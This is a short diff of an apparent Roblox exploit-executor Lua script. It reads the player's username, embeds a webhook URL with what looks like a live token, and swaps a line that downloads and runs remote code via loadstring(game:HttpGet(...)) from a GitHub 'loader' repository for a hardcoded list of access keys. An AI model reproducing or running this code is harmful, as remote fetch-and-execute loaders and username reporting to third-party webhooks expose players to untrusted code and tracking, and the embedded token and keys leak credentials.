@@ -5,7 +5,7 @@ local Players = game:GetService("Players")
 local username = Players.LocalPlayer.Name
 local webhook = "https://webhook.lewisakura.moe/api/webhooks/1364600070976045096/7mFbkdeJRvlUCYcsMubJPQIWBZMQQLcDoydcbN75uVuHmcAggx_Z3zbCH_-iHw7Pt-mk"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/gboffloader/jay/refs/heads/main/jay", true))()
+local valid_keys = {"0Vl8mWwsVf1WZmk82RMI", "ardXc1Glqg6uwpOSt6Xj", "tE7J36QkFjuYAtkJkZ8p", "zb9tAojqgU9w0pGsLJvI", "gosaZr4MG70dpE11YhEa", "nv9JOGFDnRtcrnbY4Hyx", "OYrgs1SGgrGlHRUAoSKG", "E4fgYUg8dfBkwVK9wLwj", "ZfnLckYqVPHm1nyRP7lU", "yciz8rC9vtBikqmdGgM9"}
 local is_valid = false
 for _, key in ipairs(valid_keys) do
     if getgenv().key == key then
